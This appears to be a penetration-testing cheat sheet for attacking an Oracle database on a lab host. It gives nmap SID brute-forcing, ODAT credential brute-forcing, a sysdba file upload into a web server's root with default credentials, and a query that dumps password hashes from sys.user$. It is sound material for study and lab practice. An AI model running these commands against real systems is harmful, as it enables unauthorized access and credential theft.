- [ ] Oracle FootPrinting
- [ ] Oracle Database Attacking Tool - ODAT
- [ ] Oracle Connexion - Sqlplus

Oracle FootPrinting!!!
```sh
nmap -p1521 -sV 10.129.237.131
nmap -p1521 -sV --script oracle-sid-brute IP
```
Oracle Database Attacking Tool - ODAT!!!
```sh
python3 odat.py all -s 10.129.237.131 # SID Bruteforcing
python3 odat.py all -s 10.129.237.131 --accounts-files logins.txt  pwds.txt
python3 odat.py utlfile -s 10.129.237.131 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
curl -X GET http://10.129.237.131/testing.txt

https://github.com/quentinhardy/odat/wiki
```
Oracle Connexion - Basic Commands!!!
```sh
sqlplus scott/tiger@10.129.237.131/XE
sqlplus scott/tiger@10.129.237.131/XEXDB
sqlplus scott/tiger@10.129.237.131/XE as sysdba
# sqlplus commands
select table_name from all_tables;
select name, password from sys.user$;
```